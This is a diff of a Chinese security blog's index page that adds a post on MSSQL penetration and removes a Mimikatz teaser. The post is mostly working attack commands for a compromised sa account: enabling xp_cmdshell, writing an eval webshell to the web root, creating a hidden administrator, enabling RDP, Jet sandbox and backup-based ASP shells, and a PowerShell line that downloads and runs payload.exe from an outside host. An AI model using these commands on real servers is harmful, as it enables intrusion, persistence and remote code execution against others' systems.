@@ -675,6 +675,241 @@
 
 
   
+    <article id="post-mssql渗透相关" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/04/05/mssql%E6%B8%97%E9%80%8F%E7%9B%B8%E5%85%B3/">mssql渗透相关</a>
+    </h1>
+  
+
+        
+        <a href="/2022/04/05/mssql%E6%B8%97%E9%80%8F%E7%9B%B8%E5%85%B3/" class="archive-article-date">
+  	<time datetime="2022-04-05T05:47:17.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-04-05</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>mssql渗透相关</p>
+<!---MORE-->
+
+<p>简单查询命令</p>
+<pre><code>select @@VERSION         #查看数据库版本
+select @@servername      #查看服务器主机信息
+select db_name()         #查看当前数据库名称
+select user              #查看当前用户
+SP_HELPUSER              #查看用户相关信息  
+SP_HELPROLE              #查看服务器角色相关信息  
+select IS_SRVROLEMEMBER  #查看数据库权限
+
+select is_srvrolemember(&#39;sysadmin&#39;) # 判断是否是SA权限
+select is_member(&#39;db_owner&#39;)        # 判断是否是db_owner权限  
+select is_srvrolemember(&#39;public&#39;)   # 判断是否是public权限
+
+#获取MSSQL中的所有数据库名  
+SELECT name FROM MASter..SysDatabASes ORDER BY name   
+#查询所有数据库中的表名
+SELECT SysObjects.name AS Tablename FROM sysobjects WHERE xtype = &#39;U&#39; and sysstat&lt;200
+
+exec xp_getnetname    #获取服务器名称
+exec xp_msver	      #获取服务器信息
+exec xp_fixeddrives   #获取磁盘空间信息
+
+</code></pre>
+<h4 id="一、sa用户-system权限"><a href="#一、sa用户-system权限" class="headerlink" title="一、sa用户 + system权限"></a>一、sa用户 + system权限</h4><p>mssql数据库的DBA用户名为 sa ，一般拥有 SYSTEM 权限，且默认允许远程登录。</p>
+<p>假设已通过弱口令或web配置文件拿到 sa 用户的密码。</p>
+<p>则可以直接通过 ssms 或 DBeaver 远程登录，并通过以下几种方式执行命令：</p>
+<h5 id="1-xp-cmdshell"><a href="#1-xp-cmdshell" class="headerlink" title="1. xp_cmdshell"></a>1. xp_cmdshell</h5><p>xp_cmdshell默认在mssql2000中是开启的，在mssql2005之后默认禁止，但未删除</p>
+<p>查看xp_cmdshell状态</p>
+<pre><code>select count(*) from master.dbo.sysobjects where xtype=&#39;x&#39; and name=&#39;xp_cmdshell&#39;
+</code></pre>
+<p>开启xp_cmdshell组件</p>
+<pre><code>EXEC sp_configure &#39;show advanced options&#39;, 1
+RECONFIGURE
+EXEC sp_configure &#39;xp_cmdshell&#39;,1    #此处改为0即关闭
+RECONFIGURE
+</code></pre>
+<p>xp_cmdshell存储过程被删除的情况下重新添加</p>
+<pre><code>EXEC sp_addextendedproc xp_cmdshell,@dllname =&#39;xplog70.dll&#39;declare @o int;
+sp_addextendedproc &#39;xp_cmdshell&#39;, &#39;xpsql70.dll&#39;;
+</code></pre>
+<p>执行命令</p>
+<pre><code>exec xp_cmdshell &quot;whoami&quot;
+master..xp_cmdshell &#39;whoami&#39;    #(2008版上好像用不了)
+EXEC master..xp_cmdshell &quot;whoami&quot;
+EXEC master.dbo.xp_cmdshell &quot;ipconfig&quot;
+</code></pre>
+<p>查询操作系统和版本信息</p>
+<pre><code>exec master..xp_cmdshell &#39;systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;&#39;
+exec master..xp_cmdshell &#39;systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;&#39;
+</code></pre>
+<p>写webshell</p>
+<pre><code>exec master..xp_cmdshell &#39;echo ^&lt;%@ Page Language=&quot;Jscript&quot;%^&gt;^&lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%^&gt; &gt; c:\\inetpub\\wwwroot\\x.aspx&#39;
+</code></pre>
+<p>创建用户并加入管理员组</p>
+<pre><code>exec master..xp_cmdshell &quot;net user hack admin!@#45 /add&quot;
+exec master..xp_cmdshell &quot;net localgroup administrators hack /add&quot;
+exec master..xp_cmdshell &quot;net user hack&quot;
+</code></pre>
+<p>开启远程桌面</p>
+<pre><code>#查询是否开启远程桌面 (0表示开启，1表示关闭)
+EXEC master..xp_regread &#39;HKEY_LOCAL_MACHINE&#39;,
+&#39;SYSTEM\CurrentControlSet\Control\Terminal Server&#39;,
+&#39;fDenyTSConnections&#39;
+
+#判断远程桌面RDP端口
+EXEC master..xp_cmdshell &#39;reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp /v PortNumber&#39;
+
+#开启远程桌面
+EXEC master.dbo.xp_regwrite&#39;HKEY_LOCAL_MACHINE&#39;,
+&#39;SYSTEM\CurrentControlSet\Control\TerminalServer&#39;,
+&#39;fDenyTSConnections&#39;,&#39;REG_DWORD&#39;,0;
+</code></pre>
+<h5 id="2-sp-oacreate"><a href="#2-sp-oacreate" class="headerlink" title="2. sp_oacreate"></a>2. sp_oacreate</h5><p><code>sp_oacreate</code> 系统存储过程可以用于对文件删除、复制、移动等操作，还可以配合 <code>sp_oamethod</code> 系统存储过程调用系统 <code>wscript.shell</code> 来执行系统命令。</p>
+<p><code>sp_oacreate</code> 和 <code>sp_oamethod</code> 两个过程分别用来创建和执行脚本语言。</p>
+<p>查看 sp_oacreate 状态</p>
+<pre><code>#返回1表示存在 sp_oacreate 系统存储过程
+select count(*) from master.dbo.sysobjects where xtype=&#39;x&#39; and name=&#39;SP_OACREATE&#39;;
+</code></pre>
+<p>启用OLE Automation Procedures选项</p>
+<pre><code>exec sp_configure &#39;show advanced options&#39;,1;
+reconfigure;
+exec sp_configure &#39;Ole Automation Procedures&#39;,1;
+reconfigure;
+</code></pre>
+<p>利用 sp_oacreate 和 sp_oamethod 执行命令</p>
+<pre><code>#回显0表示命令执行成功
+declare @shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output 
+exec sp_oamethod @shell,&#39;run&#39;,null,&#39;c:\windows\system32\cmd.exe /c whoami &gt;c:\\whoami.txt&#39;;
+</code></pre>
+<p>贴常用的一些危险的存储过程，可自查存储过程的功能和用法：</p>
+<pre><code>xp_cmdshell
+xp_dirtree
+xp_enumgroups
+xp_fixeddrives
+xp_loginconfig
+xp_enumerrorlogs
+xp_getfiledetails
+Sp_OACreate
+Sp_OADestroy
+Sp_OAGetErrorInfo
+Sp_OAGetProperty
+Sp_OAMethod
+Sp_OASetProperty
+Sp_OAStop
+Xp_regaddmultistring
+Xp_regdeletekey
+Xp_regdeletevalue
+Xp_regenumvalues
+Xp_regread
+Xp_regremovemultistring
+Xp_regwrite
+sp_makewebtask
+</code></pre>
+<h5 id="3-沙盒"><a href="#3-沙盒" class="headerlink" title="3. 沙盒"></a>3. 沙盒</h5><p>沙盒提权的原理就是<code>jet.oledb</code>（修改注册表）执行系统命令。数据库通过查询方式调用<code>mdb</code>文件，执行参数，绕过系统本身自己的执行命令，实现<code>mdb</code>文件执行命令。</p>
+<p>测试 <code>jet.oledb</code> 是否能用</p>
+<pre><code>select * from openrowset(&#39;microsoft.jet.oledb.4.0&#39;,&#39;;database=c:\windows\system32\ias\ias.mdb&#39;,&#39;select shell(&quot;cmd.exe /c whoami&quot;)&#39;)
+</code></pre>
+<p>开启Ad Hoc Distributed Queries组件</p>
+<pre><code>exec sp_configure &#39;show advanced options&#39;,1 ;
+reconfigure ;
+exec sp_configure &#39;Ad Hoc Distributed Queries&#39;,1 ;
+reconfigure;
+</code></pre>
+<p>关闭沙盒模式</p>
+<pre><code>exec master..xp_regwrite &#39;HKEY_LOCAL_MACHINE&#39;,&#39;SOFTWARE\Microsoft\Jet\4.0\Engines&#39;,&#39;SandBoxMode&#39;,&#39;REG_DWORD&#39;,0;
+</code></pre>
+<p>查看命令</p>
+<pre><code>exec master.dbo.xp_regread &#39;HKEY_LOCAL_MACHINE&#39;,&#39;SOFTWARE\Microsoft\Jet\4.0\Engines&#39;, &#39;SandBoxMode&#39;
+</code></pre>
+<p>执行命令</p>
+<pre><code>Select * From OpenRowSet(&#39;Microsoft.Jet.OLEDB.4.0&#39;,&#39;;Database=c:\windows\system32\ias\ias.mdb&#39;,&#39;select shell(&quot;cmd.exe /c whoami &gt;c:\\whoami.txt &quot;)&#39;);
+</code></pre>
+<h5 id="4-差异备份拿shell"><a href="#4-差异备份拿shell" class="headerlink" title="4. 差异备份拿shell"></a>4. 差异备份拿shell</h5><pre><code>backup database 库名 to disk = &#39;c:\bak.bak&#39;;--
+
+create table [dbo].[test] ([cmd] [image]);
+
+insert into test(cmd) values(0x3C25657865637574652872657175657374282261222929253E)
+
+backup database 库名 to disk=&#39;C:\d.asp&#39; WITH DIFFERENTIAL,FORMAT;--
+</code></pre>
+<p>因为权限的问题，最好不要备份到盘符根目录</p>
+<p>当过滤了特殊的字符比如单引号，或者 路径符号 都可以使用定义局部变量来执行。</p>
+<h5 id="5-log备份拿shell"><a href="#5-log备份拿shell" class="headerlink" title="5. log备份拿shell"></a>5. log备份拿shell</h5><p>LOG备份的要求是他的数据库备份过，而且选择恢复模式得是完整模式，至少在2008上是这样的，但是使用log备份文件会小的多，当然如果权限够高可以设置他的恢复模式。</p>
+<pre><code>alter database 库名 set RECOVERY FULL 
+
+create table cmd (a image) 
+
+backup log 库名 to disk = &#39;c:\xxx&#39; with init 
+
+insert into cmd (a) values (0x3C25657865637574652872657175657374282261222929253E) 
+
+backup log 库名 to disk = &#39;c:\xxx\2.asp&#39;
+</code></pre>
+<h4 id="二、降权sa用户-无web访问权限"><a href="#二、降权sa用户-无web访问权限" class="headerlink" title="二、降权sa用户 + 无web访问权限"></a>二、降权sa用户 + 无web访问权限</h4><p>当然，拿到 sa 用户也有可能是被降权后的。权限是 <code>service\mssqlserver</code> 权限。</p>
+<p>假设通过弱口令拿到了被降权的 sa 用户或其他具有dbo权限的用户。<code>xp_cmdshell</code> 仍然可用，但由于权限问题无法向web路径写入webshell。</p>
+<p>此时上面几种方法几乎全部失效，经测试，可以通过<code>xp_cmdshell</code>调用powershell进而下载exe木马文件后并执行，来实现msf或cs上线。</p>
+<pre><code>exec master..xp_cmdshell &#39;&quot;echo $client = New-Object System.Net.WebClient &gt; %TEMP%\test.ps1 &amp; echo $client.DownloadFile(&quot;http://x.x.x.x/payload.exe&quot;,&quot;%TEMP%\payload.exe&quot;) &gt;&gt; %TEMP%\test.ps1 &amp; powershell  -ExecutionPolicy Bypass  %temp%\test.ps1 &amp; WMIC process call create &quot;%TEMP%\payload.exe&quot;&quot;&#39;
+</code></pre>
+<p>成功通过降权sa用户拿到shell，可进一步通过msf或cs进行提权测试。</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">渗透</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2022/04/05/mssql%E6%B8%97%E9%80%8F%E7%9B%B8%E5%85%B3/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-fastjson相关" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -798,85 +1033,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2022/03/01/linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Mimikatz原理和使用" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/01/25/Mimikatz%E5%8E%9F%E7%90%86%E5%92%8C%E4%BD%BF%E7%94%A8/">Mimikatz原理和使用</a>
-    </h1>
-  
-
-        
-        <a href="/2022/01/25/Mimikatz%E5%8E%9F%E7%90%86%E5%92%8C%E4%BD%BF%E7%94%A8/" class="archive-article-date">
-  	<time datetime="2022-01-25T06:33:52.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-01-25</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="Mimikatz使用手册"><a href="#Mimikatz使用手册" class="headerlink" title="Mimikatz使用手册"></a>Mimikatz使用手册</h3><pre><code>原理：
-
-    当用户登陆后,会把账号密码保存在 lsass中，lsass是微软 Windows系统的安全机制它主要用于本地安全和登陆策略，通常我们在登陆系统时输入密码之后，密码便会储存在lsass内存中，经过其 Wdigest和 tspg两个模块调用后，对其使用可逆的算法进行加密并存储在内存之中，而mimikatz正是通过对lsass的逆算获取到明文密码
-</code></pre>
-        
-          <a class="article-more-a" href="/2022/01/25/Mimikatz%E5%8E%9F%E7%90%86%E5%92%8C%E4%BD%BF%E7%94%A8/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">工具</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/01/25/Mimikatz%E5%8E%9F%E7%90%86%E5%92%8C%E4%BD%BF%E7%94%A8/">展开全文 >></a>
         </p>
       
 
